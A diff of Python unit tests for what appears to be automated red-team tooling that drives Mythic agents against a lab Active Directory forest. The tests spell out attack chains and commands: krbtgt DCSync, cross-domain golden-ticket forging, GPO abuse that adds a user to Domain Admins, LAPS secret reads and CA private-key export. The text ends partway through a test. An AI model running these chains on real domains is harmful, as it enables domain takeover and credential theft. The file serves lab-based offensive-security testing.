@@ -21,6 +21,7 @@ import capabilities  # noqa: E402
 import engagement_state  # noqa: E402
 import engagement_ledger  # noqa: E402
 import intent_classifier  # noqa: E402
+import mythic_capability_adapter  # noqa: E402
 import mythic_tools  # noqa: E402
 import prompt_loader  # noqa: E402
 from mythic_tools import MythicTools  # noqa: E402
@@ -195,6 +196,20 @@ def test_flag_off_no_op_does_not_invoke_gate():
 
     assert result == "normal result"
     assert calls["issue"] == 1
+
+
+def test_issue_task_decodes_bytes_output_before_downstream_processing():
+    mt = _make_tools()
+    raw = (
+        b"Directory listing for: C:\\Users\\Public\r\n\r\n"
+        b"-rw-rw-rw-\t2026-06-26 18:16:55\t1234\tbloodhound_ab12cd34.zip\r\n"
+    )
+
+    with _split_issue(raw):
+        result = asyncio.run(mt.issue_task_and_waitfor_task_output("whoami", "", 11))
+
+    assert result == raw.decode("utf-8")
+    assert not result.startswith("b'")
 
 
 def test_issue_task_refuses_dead_callback_before_mythic_tasking():
@@ -1097,6 +1112,36 @@ The command completed successfully.
     assert hop.evidence["mythic_task_id"] == 282
 
 
+def test_extract_domain_admin_membership_probe_accepts_net_user_global_group_membership():
+    mt = _make_tools()
+    mt._engagement_footholds = [
+        engagement_state.Foothold(
+            callback_id="3",
+            agent="merlin",
+            host="CASTELBLACK",
+            forest="north.sevenkingdoms.local",
+            identity="NORTH\\samwell.tarly",
+            integrity="medium",
+            alive=True,
+            source="test",
+            timestamp="2026-06-15T20:00:00Z",
+        )
+    ]
+    mt._last_issued_callback_id = 3
+    output = """
+User name                    samwell.tarly
+Global Group memberships     *Night Watch          *Domain Admins
+The command completed successfully.
+"""
+
+    probe = mt._extract_domain_admin_membership_probe(output)
+
+    assert probe["domain_admin"] is True
+    assert probe["group_query_succeeded"] is True
+    assert probe["principal_present"] is True
+    assert probe["member_of"] == ["Domain Admins"]
+
+
 def test_record_capability_result_bridge_records_and_persists():
     mt = _make_tools()
     action = capabilities.CapabilityAction(
@@ -1214,6 +1259,175 @@ def test_build_capability_commands_bridge_uses_mythic_adapter():
     assert fallback["commands"][0]["parameters"] == {
         "commands": '"lsadump::dcsync /domain:lab.local /user:LAB\\krbtgt"',
     }
+
+
+@pytest.mark.parametrize(
+    ("payload_type", "expected_commands", "expected_parameters"),
+    [
+        (
+            "merlin",
+            ["load-assembly", "invoke-assembly"],
+            [
+                {"filename": "SharpKatz.exe"},
+                {
+                    "assembly": "SharpKatz.exe",
+                    "arguments": "--Command dcsync --User LAB\\krbtgt --Domain lab.local",
+                },
+            ],
+        ),
+        (
+            "apollo",
+            ["dcsync"],
+            [{"domain": "lab.local", "user": "krbtgt"}],
+        ),
+    ],
+)
+def test_build_capability_commands_selects_adapter_from_callback_payload_type(
+    monkeypatch,
+    payload_type,
+    expected_commands,
+    expected_parameters,
+):
+    mt = _make_tools()
+    action = capabilities.CapabilityAction(
+        name="dcsync-krbtgt",
+        target="domain=lab.local;account=krbtgt;callback=7",
+        preconditions=["ds-replication-rights:lab.local", "live-foothold:*"],
+        effects=["krbtgt-hash:lab.local"],
+        intent={
+            "capability": "dcsync-krbtgt",
+            "domain": "lab.local",
+            "account": "krbtgt",
+            "callback_id": "7",
+        },
+    )
+
+    async def fake_payload_type(callback_id):
+        assert callback_id == 7
+        return payload_type
+
+    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
+
+    plan = json.loads(asyncio.run(mt.build_capability_commands(action)))
+
+    assert plan["ok"] is True
+    assert [command["command"] for command in plan["commands"]] == expected_commands
+    assert [command["parameters"] for command in plan["commands"]] == expected_parameters
+    if payload_type == "merlin":
+        assert plan["commands"][0]["expected_probe"] == ""
+        assert plan["commands"][1]["expected_probe"] == "extract_dcsync_secret_probe"
+
+
+def test_build_capability_commands_preserves_explicit_mythic_adapter_over_payload_profile(monkeypatch):
+    mt = _make_tools()
+    action = capabilities.CapabilityAction(
+        name="dcsync-krbtgt",
+        target="domain=lab.local;account=krbtgt;callback=7",
+        preconditions=["ds-replication-rights:lab.local", "live-foothold:*"],
+        effects=["krbtgt-hash:lab.local"],
+        intent={
+            "capability": "dcsync-krbtgt",
+            "domain": "lab.local",
+            "account": "krbtgt",
+            "callback_id": "7",
+        },
+    )
+
+    async def fake_payload_type(callback_id):
+        assert callback_id == 7
+        return "merlin"
+
+    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
+
+    plan = json.loads(asyncio.run(mt.build_capability_commands(action, {
+        "mythic_adapter": {
+            "drsuapi_command": "custom_dcsync",
+            "drsuapi_domain_param": "realm",
+            "drsuapi_user_param": "principal",
+        },
+    })))
+
+    assert plan["ok"] is True
+    assert plan["commands"][0]["command"] == "custom_dcsync"
+    assert plan["commands"][0]["parameters"] == {
+        "realm": "lab.local",
+        "principal": "krbtgt",
+    }
+
+
+def test_build_capability_commands_merges_runtime_overrides_into_auto_bound_payload_profile(monkeypatch):
+    mt = _make_tools()
+
+    async def fake_payload_type(callback_id):
+        assert callback_id == 13
+        return "merlin"
+
+    async def fake_fetch_credentials(now):
+        return [
+            {
+                "id": 91,
+                "account": "Administrator",
+                "realm": "ws01",
+                "type": "plaintext",
+                "credential_text": "CorrectHorseBatteryStaple!",
+                "comment": "managed local admin password for ws01",
+            },
+        ]
+
+    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
+    mt._fetch_credentials_cached = fake_fetch_credentials
+
+    plan = json.loads(asyncio.run(mt.build_capability_commands(
+        {
+            "capability": "execute-as-local-admin",
+            "target_host": "ws01",
+            "target_domain": "child.lab.local",
+            "callback_id": "13",
+        },
+        {
+            "native_remote_exec_wait_seconds": "11",
+        },
+    )))
+
+    assert plan["ok"] is True
+    assert [command["command"] for command in plan["commands"]] == ["rev2Self", "run"]
+    assert plan["commands"][0]["parameters"] == {}
+    assert plan["commands"][1]["parameters"]["executable"] == "powershell.exe"
+    encoded = plan["commands"][1]["parameters"]["arguments"].rsplit(" ", 1)[1]
+    script = base64.b64decode(encoded).decode("utf-16le")
+    assert "Start-Sleep -Seconds 11" in script
+    assert plan["commands"][1]["expected_probe"] == "extract_remote_execution_probe"
+
+
+def test_probe_authentication_context_uses_merlin_collection_profile(monkeypatch):
+    mt = _make_tools()
+    calls = []
+    token_output = (
+        "Process (Primary) Token:\n"
+        "\tUser: NORTH\\samwell.tarly,Token ID: 0x1,Logon ID: 0x123,Privilege Count: 1,"
+        "Group Count: 1,Type: Primary,Impersonation Level: Anonymous,Integrity Level: High\n"
+        "Thread (Primary) Token:\n"
+        "\tUser: NORTH\\samwell.tarly,Token ID: 0x2,Logon ID: 0x123,Privilege Count: 1,"
+        "Group Count: 1,Type: Primary,Impersonation Level: Anonymous,Integrity Level: High"
+    )
+
+    async def fake_issue(command, parameters, callback_display_id, **_kwargs):
+        calls.append((command, parameters, callback_display_id))
+        return token_output
+
+    monkeypatch.setattr(mt, "issue_task_and_waitfor_task_output", fake_issue)
+
+    context = asyncio.run(mt.probe_authentication_context(
+        7,
+        host="castelblack",
+        adapter=mythic_capability_adapter.MERLIN_MYTHIC_ADAPTER,
+        known_domain_authorities={"north.sevenkingdoms.local"},
+    ))
+
+    assert calls == [("token", {"method": "whoami"}, 7)]
+    assert context.active_identity == "NORTH\\samwell.tarly"
+    assert context.current_luid == "0x123"
+    assert context.domain_capable is True
 
 
 def test_gpo_fallback_group_add_uses_membership_proof_without_proof_file():
@@ -1952,6 +2166,96 @@ def test_execute_capability_gpo_direct_invalid_xml_waits_for_membership_before_r
     assert "system-exec:gpo:starkwallpaper@north.sevenkingdoms.local" in result["achieved_effects"]
 
 
+def test_execute_capability_gpo_direct_valid_xml_system_author_does_not_close_effect_transaction(monkeypatch):
+    monkeypatch.setenv("SAGE_TRAJECTORY_DISABLE", "1")
+    mt = _make_tools()
+    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
+    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
+    mt._engagement_footholds = [
+        engagement_state.Foothold(
+            callback_id="3",
+            agent="apollo",
+            host="CASTELBLACK",
+            forest="north.sevenkingdoms.local",
+            identity="NORTH\\samwell.tarly",
+            integrity="medium",
+            alive=True,
+            source="test",
+            timestamp="2026-06-15T20:00:00Z",
+        )
+    ]
+    waits = []
+
+    async def fake_sleep(seconds, result=None):
+        if seconds:
+            waits.append(seconds)
+        return result
+
+    monkeypatch.setattr(mythic_tools.asyncio, "sleep", fake_sleep)
+    valid_xml = (
+        "<ScheduledTasks><Task><Properties><Author>NT AUTHORITY\\SYSTEM</Author>"
+        "<Arguments>/c net group &quot;Domain Admins&quot; samwell.tarly /add /domain</Arguments>"
+        "</Properties></Task></ScheduledTasks>"
+    )
+    outputs = iter([
+        "GPO was modified successfully",
+        valid_xml,
+        (
+            "Group name     Domain Admins\n"
+            "Members\n"
+            "-------------------------------------------------------------------------------\n"
+            "Administrator            samwell.tarly\n"
+            "The command completed successfully.\n"
+        ),
+    ])
+    calls = {}
+
+    with patch.object(access_reconciler, "reconcile_access", _seeded_reconcile(mt)), \
+        _split_issue(lambda: next(outputs), calls, display_id=3140):
+        raw = asyncio.run(mt.execute_capability(
+            {
+                "capability": "gpo-controlled-system-exec",
+                "domain": "north.sevenkingdoms.local",
+                "gpo": "starkwallpaper",
+                "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
+                "callback_id": 3,
+            },
+            {
+                "callback_id": 3,
+                "command": "cmd.exe",
+                "arguments": r'/c net group "Domain Admins" samwell.tarly /add /domain',
+                "wait_seconds": 1,
+                "proof_retries": 0,
+            },
+        ))
+
+    result = json.loads(raw)
+    assert result["ok"] is True
+    assert result["verdict"] == "achieved"
+    assert waits == [1]
+    assert [call["command_name"] for call in calls["issued"]] == ["execute_assembly", "shell", "shell"]
+    assert result["issued"][1]["expected_probe"] == "extract_gpo_system_exec_probe"
+    assert result["issued"][1]["verify_verdict"] == "achieved"
+    assert result["issued"][-1]["expected_probe"] == "extract_gpo_domain_admin_membership_probe"
+    assert result["issued"][-1]["verify_verdict"] == "achieved"
+    assert [call["command_name"] for call in calls["issued"]].count("execute_assembly") == 1
+    verification_events = [
+        event for event in result["transaction"]["events"]
+        if event["stage"] == "effect_verification"
+    ]
+    assert any(
+        event["final_probe"] is False and event["verdict"] == "achieved"
+        for event in verification_events
+    )
+    assert verification_events[-1]["final_probe"] is True
+    assert result["transaction"]["status"] == "effect_achieved"
+    hop = next(
+        hop for hop in mt._engagement_hops
+        if "system-exec:gpo:starkwallpaper@north.sevenkingdoms.local" in hop.satisfied_effects
+    )
+    assert hop.evidence["source"] == "execute_capability"
+
+
 def test_execute_capability_gpo_direct_missing_membership_pins_transaction(monkeypatch):
     monkeypatch.setenv("SAGE_TRAJECTORY_DISABLE", "1")
     mt = _make_tools()
@@ -2022,6 +2326,115 @@ def test_execute_capability_gpo_direct_missing_membership_pins_transaction(monke
     assert "extract_gpo_domain_admin_membership_probe" in result["transaction"]["proof_obligations"]
     assert waits == [1]
     assert [call["command_name"] for call in calls["issued"]] == ["execute_assembly", "shell", "shell"]
+
+
+def test_execute_capability_repairs_gpo_artifact_read_without_replaying_mutation(monkeypatch):
+    monkeypatch.setenv("SAGE_TRAJECTORY_DISABLE", "1")
+    mt = _make_tools()
+    mt._engagement_footholds = [
+        engagement_state.Foothold(
+            callback_id="3",
+            agent="merlin",
+            host="CASTELBLACK",
+            forest="north.sevenkingdoms.local",
+            identity="NORTH\\samwell.tarly",
+            integrity="medium",
+            alive=True,
+            source="test",
+            timestamp="2026-06-15T20:00:00Z",
+        )
+    ]
+    waits = []
+    shell_schema_calls = {"count": 0}
+
+    async def fake_payload_type(callback_display_id):
+        assert callback_display_id == 3
+        return "merlin"
+
+    async def fake_schema(command, callback_display_id):
+        if command == "shell":
+            shell_schema_calls["count"] += 1
+            return None if shell_schema_calls["count"] == 1 else _merlin_shell_schema()
+        return []
+
+    async def fake_sleep(seconds, result=None):
+        if seconds:
+            waits.append(seconds)
+        return result
+
+    real_build = mt._capability_build_command_payload
+
+    async def malformed_old_merlin_build(action, inputs):
+        payload = await real_build(action, inputs)
+        artifact_read = payload["commands"][1]
+        assert artifact_read["command"] == "run"
+        assert artifact_read["parameters"]["executable"] == "more.com"
+        artifact_read["command"] = "shell"
+        artifact_read["parameters"] = "type " + artifact_read["parameters"]["arguments"]
+        return payload
+
+    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
+    monkeypatch.setattr(mt, "_fetch_command_schema", fake_schema)
+    monkeypatch.setattr(mythic_tools.asyncio, "sleep", fake_sleep)
+    monkeypatch.setattr(mt, "_capability_build_command_payload", malformed_old_merlin_build)
+
+    valid_xml = (
+        "<ScheduledTasks><Task><Arguments>"
+        "/c net group &quot;Domain Admins&quot; samwell.tarly /add /domain"
+        "</Arguments></Task></ScheduledTasks>"
+    )
+    outputs = iter([
+        "GPO was modified successfully",
+        "Failed to run shell's ParseArgString function: invalid character 'y' in literal true (expecting 'r')",
+        valid_xml,
+        (
+            "Group name     Domain Admins\n"
+            "Members\n"
+            "-------------------------------------------------------------------------------\n"
+            "Administrator            samwell.tarly\n"
+            "The command completed successfully.\n"
+        ),
+    ])
+    calls = {}
+
+    with patch.object(access_reconciler, "reconcile_access", _seeded_reconcile(mt)), \
+        _split_issue(lambda: next(outputs), calls, display_id=3139):
+        raw = asyncio.run(mt.execute_capability(
+            {
+                "capability": "gpo-controlled-system-exec",
+                "domain": "north.sevenkingdoms.local",
+                "gpo": "starkwallpaper",
+                "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
+                "callback_id": 3,
+            },
+            {
+                "callback_id": 3,
+                "command": "cmd.exe",
+                "arguments": r'/c net group "Domain Admins" samwell.tarly /add /domain',
+                "wait_seconds": 1,
+                "proof_retries": 0,
+            },
+        ))
+
+    result = json.loads(raw)
+    assert result["ok"] is True
+    assert result["verdict"] == "achieved"
+    assert waits == [1]
+    assert [call["command_name"] for call in calls["issued"]] == [
+        "execute-assembly",
+        "shell",
+        "shell",
+        "run",
+    ]
+    assert calls["issued"][1]["parameters"].startswith("type ")
+    assert calls["issued"][2]["parameters"]["args"].startswith("type ")
+    assert calls["issued"][3]["parameters"] == {
+        "executable": "net.exe",
+        "arguments": "user samwell.tarly /domain",
+    }
+    assert [call["command_name"] for call in calls["issued"]].count("execute-assembly") == 1
+    assert result["issued"][1]["repair_attempt"] == 1
+    assert result["issued"][1]["repair_kind"] == "rebuild_with_payload_schema"
 
 
 def test_build_capability_commands_supports_dcsync_account():
@@ -2232,6 +2645,19 @@ def test_deterministic_account_context_records_only_after_account_ticket_and_ser
     assert hop.evidence["callback_id"] == 13
 
 
+def test_rubeus_klist_output_marks_expected_account_ticket_context():
+    mt = _make_tools()
+    output = (
+        "[*] Action: List Kerberos Tickets (Current User)\r\n"
+        "Current LUID    : 0x1ae0916\r\n"
+        "Client Name     : cersei.lannister @ SEVENKINGDOMS.LOCAL\r\n"
+        "Server Name     : krbtgt/SEVENKINGDOMS.LOCAL @ SEVENKINGDOMS.LOCAL\r\n"
+        "Server Name     : cifs/KINGSLANDING.SEVENKINGDOMS.LOCAL @ SEVENKINGDOMS.LOCAL\r\n"
+    )
+
+    assert mt._ticket_cache_output_has_account(output, "cersei.lannister", "sevenkingdoms.local") is True
+
+
 def test_execute_capability_account_context_accumulates_ticket_cache_and_service_proof(monkeypatch):
     mt = _make_tools()
     mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
@@ -2314,6 +2740,41 @@ def test_build_capability_commands_supports_managed_secret_read():
     assert "DirectoryServices.DirectorySearcher" in rendered
     assert "LDAP://dc01.child.lab.local/DC=child,DC=lab,DC=local" in rendered
     assert "ms-Mcs-AdmPwd" in rendered
+
+
+def test_build_capability_commands_merlin_uses_inprocess_sharpview_for_managed_secret_read(monkeypatch):
+    mt = _make_tools()
+    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="dc01.child.lab.local")
+
+    async def fake_payload_type(callback_id):
+        assert callback_id == 13
+        return "merlin"
+
+    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
+
+    plan = json.loads(asyncio.run(mt.build_capability_commands(
+        {
+            "capability": "read-managed-local-admin-secret",
+            "account": "alice",
+            "account_domain": "lab.local",
+            "target_host": "ws01",
+            "target_domain": "child.lab.local",
+            "callback_id": "13",
+        },
+        {},
+    )))
+
+    assert plan["ok"] is True
+    assert [command["command"] for command in plan["commands"]] == ["load-assembly", "invoke-assembly"]
+    load, invoke = plan["commands"]
+    assert load["parameters"] == {"filename": "SharpView.exe"}
+    assert load["expected_probe"] == ""
+    assert invoke["parameters"]["assembly"] == "SharpView.exe"
+    assert "Get-DomainComputer" in invoke["parameters"]["arguments"]
+    assert "-Identity ws01.child.lab.local" in invoke["parameters"]["arguments"]
+    assert invoke["expected_probe"] == "extract_managed_local_admin_secret_probe"
+    assert invoke["produces"] == ["managed_local_admin_secret_probe"]
+    assert invoke["consumes"] == ["kerberos_account_context"]
 
 
 def test_deterministic_managed_secret_read_records_redacted_effect():
@@ -2732,6 +3193,45 @@ def test_build_capability_commands_adcs_ca_export_apollo_defaults_to_powerpick_o
     assert "-Credential $cred" in script
     assert "certutil.exe -f -p" in script
     assert "PFX_BASE64=" in script
+
+
+def test_build_capability_commands_adcs_ca_export_uses_merlin_profile_after_remote_exec(monkeypatch):
+    mt = _make_tools()
+    mt._engagement_hops = [
+        _proof_hop("remote-exec:ca01@lab.local", 7301, callback_id="13"),
+        _proof_hop("local-admin:ca01@lab.local", 7302, callback_id="13"),
+    ]
+
+    async def fake_payload_type(callback_id):
+        assert callback_id == 13
+        return "merlin"
+
+    async def fake_select(target_host, target_domain, local_account):
+        return {
+            "id": 91,
+            "account": local_account,
+            "realm": f"{target_host}.{target_domain}",
+            "credential": "CorrectHorseBatteryStaple!",
+        }
+
+    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
+    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
+
+    plan = json.loads(asyncio.run(mt.build_capability_commands(
+        {
+            "capability": "adcs-ca-private-key-export",
+            "target_host": "ca01",
+            "target_domain": "lab.local",
+            "callback_id": "13",
+        },
+        {},
+    )))
+
+    assert plan["ok"] is True
+    assert [item["command"] for item in plan["commands"]] == ["rev2Self", "run"]
+    assert plan["commands"][0]["parameters"] == {}
+    assert plan["commands"][1]["expected_probe"] == "extract_adcs_ca_private_key_probe"
+    assert plan["commands"][1]["parameters"]["executable"] == "powershell.exe"
 
 
 def test_build_capability_commands_adcs_ca_export_apollo_preserves_explicit_wmiexecute(monkeypatch):
@@ -3560,14 +4060,11 @@ def test_build_capability_commands_forge_selects_krbtgt_key_and_parent_ea_sid():
     )))
 
     assert plan["ok"] is True
-    # Cross-domain (child->parent) forge: a golden child ticket is not honored directly by the parent, so the
-    # plan forges, obtains an inter-realm referral at the child DC, exchanges that referral for a parent LDAP
-    # service ticket, loads the service ticket, then proves parent reach by replicating the parent krbtgt.
+    # Cross-domain (child->parent) forge: import the forged child TGT into the current session and let Windows
+    # acquire the parent referral/service ticket during the parent DCSync proof.
     assert [item["command"] for item in plan["commands"]] == [
         "shell",
         "shell",
-        "execute_assembly",
-        "execute_assembly",
         "execute_assembly",
         "ticket_cache_purge",
         "ticket_cache_add",
@@ -3586,31 +4083,18 @@ def test_build_capability_commands_forge_selects_krbtgt_key_and_parent_ea_sid():
     assert "/sids:S-1-5-21-444-555-666-519" in rendered
     assert "/ptt" not in rendered
     assert command["produces"] == ["kerberos_ticket_base64"]
-    # Inter-realm referral hop: presents the forged ticket to a DC and requests krbtgt/<parent>; its referral
-    # ticket overwrites the kerberos_ticket_base64 slot so the downstream import consumes the referral.
-    referral = plan["commands"][3]
-    referral_args = referral["parameters"]["assembly_arguments"]
-    assert referral_args.startswith("asktgs /ticket:{{kerberos_ticket_base64}}")
-    assert "/service:krbtgt/sevenkingdoms.local" in referral_args
-    assert referral["deferred"] is True
-    service_ticket = plan["commands"][4]
-    service_args = service_ticket["parameters"]["assembly_arguments"]
-    assert service_args.startswith("asktgs /ticket:{{kerberos_ticket_base64}}")
-    assert "/service:ldap/kingslanding.sevenkingdoms.local" in service_args
-    assert service_ticket["deferred"] is True
-    assert referral["consumes"] == ["kerberos_ticket_base64"]
-    assert referral["produces"] == ["kerberos_ticket_base64"]
-    assert plan["commands"][5]["parameters"] == {"all": True, "serviceName": "", "luid": ""}
-    # Import the parent LDAP service ticket into the current Kerberos context.
-    assert plan["commands"][6]["command"] == "ticket_cache_add"
-    assert plan["commands"][6]["deferred"] is True
-    assert "kerberos_ticket_base64" in plan["commands"][6]["consumes"]
-    assert "kerberos_logon_context" not in plan["commands"][6]["consumes"]
-    assert plan["commands"][6]["parameters"] == {"base64ticket": "{{kerberos_ticket_base64}}"}
-    assert plan["commands"][7]["command"] == "ticket_cache_list"
-    assert plan["commands"][7]["parameters"] == {"luid": "", "getSystemTickets": False}
+    assert "asktgs" not in json.dumps(plan["commands"])
+    assert plan["commands"][3]["parameters"] == {"all": True, "serviceName": "", "luid": ""}
+    # Import the child TGT into the current Kerberos context; the OS acquires the parent tickets on demand.
+    assert plan["commands"][4]["command"] == "ticket_cache_add"
+    assert plan["commands"][4]["deferred"] is True
+    assert "kerberos_ticket_base64" in plan["commands"][4]["consumes"]
+    assert "kerberos_logon_context" not in plan["commands"][4]["consumes"]
+    assert plan["commands"][4]["parameters"] == {"base64ticket": "{{kerberos_ticket_base64}}"}
+    assert plan["commands"][5]["command"] == "ticket_cache_list"
+    assert plan["commands"][5]["parameters"] == {"luid": "", "getSystemTickets": False}
     # Parent-DCSync proof: replicate the parent krbtgt from the parent DC (user qualified at issue time).
-    dcsync = plan["commands"][8]
+    dcsync = plan["commands"][6]
     assert dcsync["command"] == "dcsync"
     assert dcsync["parameters"]["domain"] == "sevenkingdoms.local"
     assert dcsync["parameters"]["user"] == "SEVENKINGDOMS\\krbtgt"
@@ -3680,6 +4164,48 @@ def test_build_capability_commands_recovers_krbtgt_key_from_recorded_dcsync_task
     assert "task 86" in created[0]["comment"]
 
 
+def test_build_capability_commands_can_opt_into_explicit_asktgs_fallback():
+    mt = _make_tools()
+
+    async def fake_fetch_credentials(now):
+        return [{
+            "id": 12,
+            "account": "krbtgt",
+            "realm": "child.root.local",
+            "type": "key",
+            "credential_text": "a" * 64,
+        }]
+
+    mt._fetch_credentials_cached = fake_fetch_credentials
+    mt._resolve_domain_sid = lambda domain: asyncio.sleep(
+        0,
+        result={
+            "child.root.local": "S-1-5-21-111-222-333",
+            "root.local": "S-1-5-21-444-555-666",
+        }.get(domain, ""),
+    )
+    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="dc01.root.local")
+
+    plan = json.loads(asyncio.run(mt.build_capability_commands(
+        {
+            "capability": "forge-golden-ticket",
+            "domain": "child.root.local",
+            "target_domain": "root.local",
+            "kerberos_ticket_acquisition_strategy": "explicit-asktgs",
+        },
+        {"child_dc": "dc01.child.root.local"},
+    )))
+
+    assert plan["ok"] is True
+    assert [item["command"] for item in plan["commands"][2:5]] == [
+        "execute_assembly",
+        "execute_assembly",
+        "execute_assembly",
+    ]
+    assert "/service:krbtgt/root.local" in plan["commands"][3]["parameters"]["assembly_arguments"]
+    assert "/service:ldap/dc01.root.local" in plan["commands"][4]["parameters"]["assembly_arguments"]
+
+
 def test_build_capability_commands_resolves_source_and_parent_domain_sids():
     mt = _make_tools()
 
@@ -3722,9 +4248,13 @@ def test_build_capability_commands_resolves_source_and_parent_domain_sids():
     assert plan["execution_plan"]["steps"][2]["parameters"]["extra_sids"] == ["S-1-5-21-444-555-666-519"]
     assert "service" not in plan["execution_plan"]["steps"][1]["parameters"]
     # Cross-domain proof is a parent-krbtgt DCSync from the parent DC, not a CIFS service-access probe.
-    referral_step = plan["execution_plan"]["steps"][3]
-    assert referral_step["operation"] == "kerberos-inter-realm-referral"
-    assert referral_step["parameters"]["service"] == "krbtgt/sevenkingdoms.local"
+    # The default path imports the child TGT and leaves referral/service acquisition to Windows.
+    import_step = plan["execution_plan"]["steps"][4]
+    assert import_step["operation"] == "kerberos-ticket-import"
+    assert import_step["parameters"]["domain"] == "north.sevenkingdoms.local"
+    assert "kerberos-inter-realm-referral" not in {
+        step["operation"] for step in plan["execution_plan"]["steps"]
+    }
     dcsync_step = plan["execution_plan"]["steps"][-1]
     assert dcsync_step["operation"] == "drsuapi-dcsync"
     assert dcsync_step["parameters"]["domain"] == "sevenkingdoms.local"
@@ -3732,13 +4262,13 @@ def test_build_capability_commands_resolves_source_and_parent_domain_sids():
     assert dcsync_step["parameters"]["dc"] == "kingslanding.sevenkingdoms.local"
 
 
-def test_cross_domain_forge_executor_skips_only_leading_preflight_not_referral_import():
+def test_cross_domain_forge_executor_skips_only_leading_preflight_not_current_tgt_import():
     # The executor skips redundant current-context preflight steps when a separate preflight already ran. That
-    # heuristic is position-agnostic and ALSO matches the cross-domain chain's core post-forge steps (referral
-    # import, purge, post-import inventory), because their purposes mention the "current Kerberos context" and
-    # the post-import list re-inventories it. Skipping the referral IMPORT collapsed the cross-domain chain live
-    # (referral TGT obtained, never loaded, parent DCSync proof denied). Drive the REAL classifier + skip
-    # predicate over the REAL build payload to lock the position-aware behavior in.
+    # heuristic is position-agnostic and ALSO matches the cross-domain chain's core post-forge steps (current
+    # TGT import, purge, post-import inventory), because their purposes mention the "current Kerberos context"
+    # and the post-import list re-inventories it. Skipping the import collapses the cross-domain chain because
+    # Windows never gets the EA-capable TGT that allows native referral acquisition. Drive the REAL classifier +
+    # skip predicate over the REAL build payload to lock the position-aware behavior in.
     mt = _make_tools()
 
     async def fake_fetch_credentials(now):
@@ -3771,10 +4301,10 @@ def test_cross_domain_forge_executor_skips_only_leading_preflight_not_referral_i
 
     # Leading inventory + access-check are skipped (redundant with the separate preflight)…
     assert issued[0] == "execute_assembly"  # golden forge, not the leading klist/dir
-    # …but every core step after the forge runs — critically the referral import and DCSync.
-    assert "ticket_cache_add" in issued, f"referral import was dropped: {issued}"
+    # …but every core step after the forge runs — critically the current-session TGT import and DCSync.
+    assert "ticket_cache_add" in issued, f"current-session TGT import was dropped: {issued}"
     assert "dcsync" in issued, f"parent DCSync was dropped: {issued}"
-    assert issued.count("execute_assembly") == 3  # golden + referral TGS + LDAP service TGS
+    assert issued.count("execute_assembly") == 1  # golden only; Windows acquires referral/service tickets
     assert issued[-1] == "dcsync"
 
 
@@ -3820,16 +4350,12 @@ def test_cross_domain_forge_issue_boundary_matches_current_cache_oracle():
     )))
     mt._cross_domain_replication_rights.add("root.local")
     forged_ticket = "A" * 88
-    referral_ticket = "B" * 88
-    service_ticket = "C" * 88
     outputs = iter([
         f"[*] base64(ticket.kirbi):\n{forged_ticket}",
-        f"[*] base64(ticket.kirbi):\n{referral_ticket}",
-        f"[*] base64(ticket.kirbi):\n{service_ticket}",
         "Ticket cache purged.",
         "Ticket successfully imported.",
         "Cached Tickets: (1)",
-        "Hash NTLM: 0123456789abcdef0123456789abcdef",
+        "[DC] 'root.local'\nHash NTLM: 0123456789abcdef0123456789abcdef",
     ])
     calls = {}
 
@@ -3839,14 +4365,12 @@ def test_cross_domain_forge_issue_boundary_matches_current_cache_oracle():
 
     assert [item["command_name"] for item in calls["issued"]] == [
         "execute_assembly",
-        "execute_assembly",
-        "execute_assembly",
         "ticket_cache_purge",
         "ticket_cache_add",
         "ticket_cache_list",
         "dcsync",
     ]
-    assert service_ticket in calls["issued"][4]["parameters"]["base64ticket"]
+    assert forged_ticket in calls["issued"][2]["parameters"]["base64ticket"]
     assert calls["issued"][-1]["parameters"] == {
         "domain": "root.local",
         "user": "ROOT\\krbtgt",
@@ -3891,11 +4415,86 @@ def test_cross_domain_forge_recognizes_parent_dcsync_as_proof():
     assert child_verif.verdict != "achieved"
 
 
-def test_cross_domain_referral_import_grants_rights_and_precheck_honors_it(monkeypatch):
+@pytest.mark.parametrize(
+    ("capability_name", "effect", "account"),
+    [
+        ("dcsync-krbtgt", "krbtgt-hash:essos.local", "krbtgt"),
+        ("dcsync-account", "creds:administrator@essos.local", "administrator"),
+    ],
+)
+def test_direct_dcsync_capabilities_verify_only_final_secret_probe(capability_name, effect, account):
+    mt = _make_tools()
+    action = capabilities.CapabilityAction(
+        name=capability_name,
+        target=f"domain=essos.local;account={account}",
+        preconditions=[],
+        effects=[effect],
+        intent={"capability": capability_name, "domain": "essos.local", "account": account},
+    )
+    setup_cmd = {
+        "command": "load-assembly",
+        "expected_probe": "",
+        "produces": [],
+        "consumes": [],
+        "purpose": "load SharpKatz",
+    }
+    dcsync_cmd = {
+        "command": "invoke-assembly",
+        "expected_probe": "extract_dcsync_secret_probe",
+        "produces": [],
+        "consumes": [],
+        "purpose": "replicate account secret",
+    }
+    secret_output = (
+        "[!] essos.local will be the domain\n"
+        f"[!] ESSOS\\{account} will be the user account\n"
+        f"[*] SAM Username         : {account}\n"
+        "[*] Credentials:\n"
+        "[*] Hash NTLM            : 0123456789abcdef0123456789abcdef\n"
+    )
+
+    setup_probe, setup_verification = mt._capability_executor_verify_output(
+        action,
+        {},
+        3,
+        "Successfully loaded sharpkatz.exe into the default AppDomain",
+        setup_cmd,
+        capabilities,
+    )
+    assert setup_probe is None
+    assert setup_verification is None
+
+    probe, verification = mt._capability_executor_verify_output(
+        action,
+        {},
+        3,
+        secret_output,
+        dcsync_cmd,
+        capabilities,
+    )
+    assert probe["krbtgt_hash_present"] is True
+    assert probe["domain"] == "essos.local"
+    assert probe["account"] == account
+    assert verification.verdict == "achieved"
+
+    no_secret_probe, no_secret_verification = mt._capability_executor_verify_output(
+        action,
+        {},
+        3,
